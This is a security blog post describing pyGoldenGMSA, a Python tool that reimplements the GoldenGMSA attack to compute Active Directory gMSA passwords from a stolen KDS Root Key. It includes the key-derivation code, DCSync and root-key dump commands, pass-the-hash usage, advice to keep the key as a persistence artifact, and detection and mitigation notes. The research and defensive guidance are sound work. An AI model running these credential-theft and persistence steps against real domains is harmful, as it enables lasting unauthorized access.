---
title: "pyGoldenGMSA - Reversing Windows DLLs to Compute gMSA Passwords on Linux"
date: 2026-02-08
draft: false
description: "How I reversed Microsoft's kdscli.dll to build a pure Python implementation of the GoldenGMSA attack, computing gMSA passwords offline from KDS Root Keys"
summary: "Building a cross-platform GoldenGMSA tool by reverse engineering Windows cryptographic DLLs and implementing NIST SP800-108 KDF from scratch"
tags: ["active-directory", "gmsa", "kds", "cryptography", "reverse-engineering", "python", "persistence", "windows"]
categories: ["Active Directory", "Tools"]
featuredImage: "featured.png"
images: ["featured.png"]
---

# pyGoldenGMSA - Reversing Windows DLLs to Compute gMSA Passwords on Linux

*Reimplementing Microsoft's cryptographic key derivation pipeline in pure Python to bring the GoldenGMSA attack to Linux-based offensive platforms.*

---

## Table of Contents

1. [Why This Matters](#why-this-matters)
2. [Understanding gMSA Architecture](#understanding-gmsa-architecture)
3. [The Key Hierarchy - A 10-Million-Key Tree](#the-key-hierarchy---a-10-million-key-tree)
4. [Reverse Engineering kdscli.dll](#reverse-engineering-kdsclidll)
5. [Implementing SP800-108 CTR HMAC in Python](#implementing-sp800-108-ctr-hmac-in-python)
6. [The Full Derivation Chain](#the-full-derivation-chain)
7. [The Bug That Took Days to Find](#the-bug-that-took-days-to-find)
8. [Using pyGoldenGMSA](#using-pygoldengmsa)
9. [Defensive Considerations](#defensive-considerations)
10. [References](#references)

---

## Why This Matters

**Group Managed Service Accounts (gMSA)** are Active Directory's answer to the eternal problem of service account passwords. Instead of a static password that never gets rotated and ends up in a spreadsheet, gMSAs have their password **automatically generated and rotated** by the domain controller using a cryptographic key derivation scheme.

Sounds secure, right? It is - until an attacker compromises a **KDS Root Key**.

In 2022, Yuval Gordon at Semperis published the [GoldenGMSA attack](https://www.semperis.com/blog/golden-gmsa-attack/): with a single KDS Root Key (readable by any Domain Admin, and stored in AD's Configuration partition), an attacker can compute the password of **every gMSA in the domain** - past, present, and future - without ever querying the DC for the actual password.

The catch? The original [GoldenGMSA tool](https://github.com/Semperis/GoldenGMSA) is written in C# and delegates all cryptographic operations to `kdscli.dll` via P/Invoke. It **only runs on Windows**.

For pentesters working from Linux (Exegol, Kali, etc.), this meant either spinning up a Windows VM or skipping the attack entirely. **pyGoldenGMSA** solves this by reimplementing the entire cryptographic pipeline in pure Python.

This article walks through the reverse engineering process, the cryptographic implementation, and the debugging journey that got us to a working tool.

---

## Understanding gMSA Architecture

### How gMSA Passwords Work

When a gMSA account is created, Active Directory doesn't store a password hash in the traditional sense. Instead, it stores:

1. **`msDS-ManagedPasswordId`** - A blob containing the L0/L1/L2 key indices and the GUID of the KDS Root Key used to derive the password
2. The password itself is **computed on demand** by the DC using the Key Distribution Service (KDS)

When a service (or authorized principal) requests the gMSA password, the DC:

1. Reads the KDS Root Key from `CN=Master Root Keys,CN=Group Key Distribution Service,CN=Services,CN=Configuration`
2. Derives a chain of intermediate keys using NIST SP800-108
3. Returns the final 256-byte password blob via the `msDS-ManagedPassword` constructed attribute

### The KDS Root Key

A KDS Root Key contains:
- **`msKds-RootKeyData`** - 64 bytes of secret key material (the crown jewel)
- **`msKds-KDFAlgorithmID`** - Always `SP800_108_CTR_HMAC`
- **`msKds-KDFParam`** - The hash algorithm to use (typically SHA512)
- **`msKds-SecretAgreementAlgorithmID`** - DH parameters for public key scenarios
- **`cn`** - The Root Key GUID

The critical insight of the GoldenGMSA attack: **the Root Key data never changes**, and the password derivation is entirely deterministic. Knowing the Root Key lets you compute any gMSA password for any point in time.

---

## The Key Hierarchy - A 10-Million-Key Tree

The MS-GKDI protocol defines a three-level key hierarchy based on time intervals. Each interval is **10 hours** (`360,000,000,000` in 100-nanosecond units).

```
                    Root Key Data (64 bytes)
                           |
                    SP800-108 KDF
                           |
              L0 Key (changes every ~13 months)
              /            |            \
         L0=0          L0=1    ...   L0=N
            |
    SP800-108 KDF + Security Descriptor
            |
    L1 Key (changes every ~13 days)
    /       |       \
 L1=0    L1=1  ...  L1=31
    |
 SP800-108 KDF
    |
 L2 Key (changes every 10 hours)
 /     |     \
L2=0  L2=1  ...  L2=31
```

### Index Calculation from Time

```python
timestamp = current_time_in_100ns_units
interval  = timestamp // 360_000_000_000  # 10-hour intervals

L0 = interval // 1024       # Changes every 1024 intervals (~426 days)
L1 = (interval // 32) & 31  # Changes every 32 intervals (~13 days)
L2 = interval & 31          # Changes every interval (10 hours)
```

Each L1 level has 32 keys (0-31), and each L2 level has 32 keys (0-31). Combined with the L0 level, this creates a massive tree where each node is cryptographically derived from its parent.

The key insight for the derivation: **keys are derived top-down** (L0 -> L1 -> L2), and within each level, they're derived **from index 31 down to 0**. This means computing L2(28) requires first computing L2(31), then L2(30), then L2(29), then L2(28) - each step using the previous key as input.

---

## Reverse Engineering kdscli.dll

The original C# GoldenGMSA tool doesn't contain the crypto - it calls two functions from Windows' `kdscli.dll`:

### P/Invoke Signatures

```csharp
// Constructs the KDF context bytes for a given key level
[DllImport("kdscli.dll")]
public static extern uint GenerateKDFContext(
    byte[] guid,           // Root Key GUID (16 bytes)
    int contextInit,       // L0 index
    long contextInit2,     // L1 index (or 0xFFFFFFFF)
    long contextInit3,     // L2 index (or 0xFFFFFFFF)
    int flag,              // 0=L0, 1=L1, 2=L2
    out IntPtr outContext,
    out int outContextSize,
    out int flag2);

// Performs the actual SP800-108 key derivation
[DllImport("kdscli.dll")]
public static extern uint GenerateDerivedKey(
    string kdfAlgorithmId,  // "SP800_108_CTR_HMAC"
    byte[] kdfParam,        // Hash algo params
    int kdfParamSize,
    byte[] pbSecret,        // Input key (64 bytes)
    long cbSecret,
    byte[] context,         // KDF context bytes
    int contextSize,
    ref int notSure,        // Context offset for iteration
    byte[] label,           // KDF label (or null)
    int labelSize,
    int notsureFlag,        // Number of iterations
    byte[] pbDerivedKey,    // Output buffer
    int cbDerivedKey,       // Output size
    int AlwaysZero);
```

### Decoding GenerateKDFContext

By analyzing how the C# code calls `GenerateKDFContext` at each level and cross-referencing with the [MS-GKDI specification](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gkdi/), we can reconstruct the context format:

```
Context = RKID (16 bytes, GUID bytes_le) ||
          L0   (4 bytes, int32 LE)       ||
          L1   (4 bytes, int32 LE)       ||
          L2   (4 bytes, int32 LE)
        = 28 bytes total
```

The `flag` parameter determines which index field is used for iteration:
- `flag=0` (L0): iteration modifies the L0 field at offset 16
- `flag=1` (L1): iteration modifies the L1 field at offset 20
- `flag=2` (L2): iteration modifies the L2 field at offset 24

The `flag2` output is the byte offset within the context where the "decrement" happens between iterations.

### Decoding GenerateDerivedKey

This was the hardest part. The function has 14 parameters, some poorly named in the C# code (`notSure`, `notsureFlag`, `AlwaysZero`). By tracing every call site:

| Parameter | Purpose |
|-----------|---------|
| `pbSecret` | HMAC key (root key data or parent derived key, 64 bytes) |
| `context` | KDF context bytes (28 bytes, or 28+SD for L1 seed) |
| `label` | `NULL` for seed keys (internally becomes `"KDS service\0"` UTF-16LE), `"GMSA PASSWORD\0"` for final |
| `notsureFlag` | **Number of KDF iterations** - this was the key revelation |
| `notSure` | Context byte offset to decrement between iterations |
| `cbDerivedKey` | 64 bytes for intermediate keys, 256 bytes for the final password |

The `notsureFlag` parameter controls how many times the KDF is called in a chain. For example, when deriving L2(28) from L1(23):
1. First call: KDF with context L2=31 -> result
2. Decrement context[24] to 30, use result as new key
3. KDF with context L2=30 -> result
4. Continue until L2=28

This is `32 - 28 = 4` iterations in a single `GenerateDerivedKey` call.

---

## Implementing SP800-108 CTR HMAC in Python

### The Standard

[NIST SP 800-108](https://csrc.nist.gov/pubs/sp/800/108/r1/upd1/final) Section 5.1 defines Counter Mode KDF:

```
K(i) = PRF(K_I, [i]_2 || Label || 0x00 || Context || [L]_2)
```

Where:
- `PRF` = HMAC-SHA512 (or HMAC-SHA256, depending on KDF params)
- `K_I` = Input key material
- `[i]_2` = Counter, 32-bit **big-endian**, starting at 1
- `Label` = Purpose string
- `0x00` = Single null byte separator
- `Context` = Variable binary context
- `[L]_2` = Desired output length **in bits**, 32-bit **big-endian**

### The Microsoft Twist

Microsoft's implementation in `kdscli.dll` (confirmed by cross-referencing with [Microsoft's reference source](https://github.com/microsoft/referencesource/blob/master/System.Web/Security/Cryptography/SP800_108.cs)) follows the standard exactly, but with specific encoding choices:

- **Label** `"KDS service"` is encoded as **null-terminated UTF-16LE**: `4B 00 44 00 53 00 20 00 73 00 65 00 72 00 76 00 69 00 63 00 65 00 00 00` (24 bytes)
- **Label** `"GMSA PASSWORD"` is also null-terminated UTF-16LE (28 bytes)
- When `GenerateDerivedKey` receives `label=NULL`, it internally uses `"KDS service\0"`

### Python Implementation

```python
def kdf(secret, label, context, output_length):
    """SP800-108 Counter Mode HMAC-SHA512 KDF."""
    hash_size = 64  # SHA-512
    num_blocks = (output_length + hash_size - 1) // hash_size
    result = b""

    for i in range(num_blocks):
        counter = struct.pack('>I', i + 1)           # [i]_2 big-endian
        length_bits = struct.pack('>I', output_length * 8)  # [L]_2 in bits
        data = counter + label + b'\x00' + context + length_bits
        result += hmac.new(secret, data, hashlib.sha512).digest()

    return result[:output_length]
```

We validated this implementation against PyCryptography's `KBKDFHMAC` class - both produce identical output byte-for-byte.

---

## The Full Derivation Chain

Here's the complete path from Root Key to gMSA password, with the actual KDF calls:

### Step 1: L0 Key

```python
context = RKID || L0 || 0xFFFFFFFF || 0xFFFFFFFF  # 28 bytes
L0_key = KDF(
    secret  = root_key_data,        # 64 bytes from msKds-RootKeyData
    label   = "KDS service\0" (UTF-16LE),
    context = context,
    length  = 64
)
```

### Step 2: L1 Seed (L1 index 31)

This is unique - the **security descriptor** is appended to the context:

```python
context = RKID || L0 || 31 || 0xFFFFFFFF || SecurityDescriptor
L1_seed = KDF(
    secret  = L0_key,
    label   = "KDS service\0" (UTF-16LE),
    context = context,               # 28 + 56 = 84 bytes
    length  = 64
)
```

The security descriptor is a hardcoded 56-byte self-relative SD granting access to Enterprise Domain Controllers (S-1-5-9):
```
01 00 04 80 30 00 00 00 00 00 00 00 00 00 00 00
14 00 00 00 02 00 1C 00 01 00 00 00 00 00 14 00
9F 01 12 00 01 01 00 00 00 00 00 05 09 00 00 00
01 01 00 00 00 00 00 05 12 00 00 00
```

### Step 3: Iterate L1 Down to Target

```python
# L1(31) -> L1(30) -> ... -> L1(target)
key = L1_seed
for n in range(30, target_l1 - 1, -1):
    context = RKID || L0 || n || 0xFFFFFFFF
    key = KDF(key, "KDS service\0", context, 64)
```

### Step 4: Reseed and Iterate L2

```python
# L2 seed from L1 key
context = RKID || L0 || target_l1 || 31
L2_key = KDF(L1_key, "KDS service\0", context, 64)

# L2(31) -> L2(30) -> ... -> L2(target)
for n in range(30, target_l2 - 1, -1):
    context = RKID || L0 || target_l1 || n
    L2_key = KDF(L2_key, "KDS service\0", context, 64)
```

### Step 5: Final Password

```python
password_blob = KDF(
    secret  = L2_key,
    label   = "GMSA PASSWORD\0" (UTF-16LE, 28 bytes),
    context = SID_bytes,            # Binary SID of the gMSA account
    length  = 256                   # 256-byte password blob
)

ntlm_hash = MD4(password_blob)     # Full 256 bytes, no truncation
```

---

## The Bug That Took Days to Find

With the KDF implementation verified against PyCryptography's `KBKDFHMAC` (byte-for-byte identical output), and the iteration logic producing the same results through three independent computation approaches, we had a mystery: **the hash was still wrong**.

### The Debugging Gauntlet

Here's what we verified along the way:

| Component | Status | How Verified |
|-----------|--------|--------------|
| SP800-108 format (counter, label, separator, length) | Correct | Matched PyCryptography KBKDFHMAC |
| Counter encoding (big-endian 32-bit) | Correct | Cross-referenced with Microsoft reference source |
| Length encoding (bits, big-endian) | Correct | Cross-referenced with MS reference source |
| Label ("KDS service\0" UTF-16LE) | Correct | Matched dpapi-ng library |
| Context format (RKID + int32_LE fields) | Correct | Matched dpapi-ng library |
| Iteration logic (L0 -> L1 -> L2) | Correct | Three independent approaches gave identical results |
| GUID byte order (bytes_le) | Correct | Matched .NET Guid.ToByteArray() |

We ran 14 different SP800-108 format variants (big/little endian counter, with/without separator, different length encodings), tested both int32 and int64 context sizes, tried every label combination - **nothing matched**.

### The Breakthrough

We used **impacket's DCSync** to get the ground truth NTLM hash directly from the DC:

```bash
$ impacket-secretsdump -just-dc-user 'svc_test$' 'lab.local/Admin:Pass@10.0.0.26'
svc_test$:1104:aad3b435b51404ee:1c368c74ef1bcbd4892c95a8d6de0f30:::
```

Then we tried every possible final derivation variant. The result:

```
MD4(password_blob[:-2]) = 51e4079bd3c9d461b11fc6bf97de9d5d   # WRONG
MD4(password_blob)      = 1c368c74ef1bcbd4892c95a8d6de0f30   # MATCH!
```

### The Root Cause

The bug was a single line:

```python
# Before (wrong):
current_password = pwd_bytes[:-2]  # Strip last 2 bytes
ntlm_hash = MD4(current_password)

# After (correct):
ntlm_hash = MD4(pwd_bytes)         # Use full 256-byte blob
```

The `[:-2]` came from **gMSADumper**, which reads the `msDS-ManagedPassword` blob from LDAP. That blob wraps the password with a null terminator, so stripping 2 bytes is correct *when reading from the blob*. But when computing the password **offline from the KDF output**, the 256-byte output IS the complete password - no null terminator to strip.

A one-character fix (`[:-2]` -> nothing) after days of debugging every cryptographic parameter. Classic.

---

## Using pyGoldenGMSA

### Step 1: Enumerate gMSA Accounts

```bash
$ python3 main.py -u 'admin@lab.local' -p 'Password1' -d lab.local \
    --dc-ip 10.0.0.26 gmsainfo

sAMAccountName:         svc_test$
objectSid:              S-1-5-21-4163040651-2381858556-3943169962-1104
rootKeyGuid:            ce084ce9-df54-2fb4-4031-72b0e32860d7
L0 Index:               363
L1 Index:               23
L2 Index:               28
```

### Step 2: Dump the KDS Root Key

```bash
$ python3 main.py -u 'admin@lab.local' -p 'Password1' -d lab.local \
    --dc-ip 10.0.0.26 kdsinfo

Guid:           ce084ce9-df54-2fb4-4031-72b0e32860d7
Base64 blob:    AQAAAOlMCM5U37Qv...
```

Save the Base64 blob - this is your **persistence artifact**. With this blob, you can compute gMSA passwords forever, even after losing domain access.

### Step 3: Compute the Password

**Online mode** (queries AD for Root Key and Password ID):
```bash
$ python3 main.py -u 'admin@lab.local' -p 'Password1' -d lab.local \
    --dc-ip 10.0.0.26 compute --sid S-1-5-21-...-1104

NTLM Hash (NT only):     1c368c74ef1bcbd4892c95a8d6de0f30
NTLM Hash (nxc format):  aad3b435b51404eeaad3b435b51404ee:1c368c74ef1bcbd4892c95a8d6de0f30
```

**Offline mode** (no network access needed):
```bash
$ python3 main.py compute \
    --sid S-1-5-21-...-1104 \
    --kdskey 'AQAAAOlMCM5U37Qv...' \
    --pwdid 'AQAAAEtEU0sC...'
```

### Step 4: Use the Hash

```bash
# Pass-the-Hash with NetExec
$ nxc smb target -u 'svc_test$' -H 1c368c74ef1bcbd4892c95a8d6de0f30

# Request a TGT with impacket
$ getTGT.py -hashes :1c368c74ef1bcbd4892c95a8d6de0f30 lab.local/svc_test$
```

---

## Defensive Considerations

### Detection

- **Monitor access to KDS Root Key objects** in `CN=Master Root Keys,CN=Group Key Distribution Service,CN=Services,CN=Configuration`. Any non-DC reading `msKds-RootKeyData` is suspicious.
- **Event ID 4662** (Object access) on KDS Root Key objects with `Read Property` on the `msKds-RootKeyData` attribute.
- **Audit gMSA password retrieval** - Event ID 4662 on gMSA objects for `msDS-ManagedPassword`.

### Mitigation

- **Restrict access** to KDS Root Key objects. By default, Domain Admins can read them - consider limiting this to DCs only.
- **Rotate KDS Root Keys** periodically. While this doesn't invalidate the attack for the current key, it limits the window for older keys.
- **Use Managed Service Accounts (MSA)** instead of gMSA where possible - they're scoped to a single machine and don't use KDS.
- **Implement tiered administration** - if Domain Admin credentials are compromised, gMSA passwords are the least of your problems.

### Key Takeaways

The GoldenGMSA attack is a **persistence mechanism**, not an initial access vector. If an attacker can read KDS Root Keys, they already have Domain Admin privileges. The value of this attack is **long-term persistence** - the Root Key doesn't change, so a single exfiltration provides permanent access to all gMSA passwords until the key is rotated.

---

## References

- **Yuval Gordon** - [Introducing the Golden GMSA Attack](https://www.semperis.com/blog/golden-gmsa-attack/) (Semperis, 2022)
- **Semperis** - [GoldenGMSA C# Tool](https://github.com/Semperis/GoldenGMSA)
- **Microsoft** - [MS-GKDI: Group Key Distribution Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gkdi/)
- **Microsoft** - [MS-ADTS: msDS-ManagedPassword](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/)
- **NIST** - [SP 800-108: KDF in Counter Mode](https://csrc.nist.gov/pubs/sp/800/108/r1/upd1/final)
- **Jordan Borean** - [dpapi-ng Python library](https://github.com/jborean93/dpapi-ng) (reference for KDF implementation)
- **Microsoft** - [SP800_108.cs Reference Source](https://github.com/microsoft/referencesource/blob/master/System.Web/Security/Cryptography/SP800_108.cs)
- **Micah Van Deusen** - [gMSADumper](https://github.com/micahvandeusen/gMSADumper)
- **pyGoldenGMSA** - [GitHub Repository](https://github.com/felixbillieres/pyGoldenGMSA)
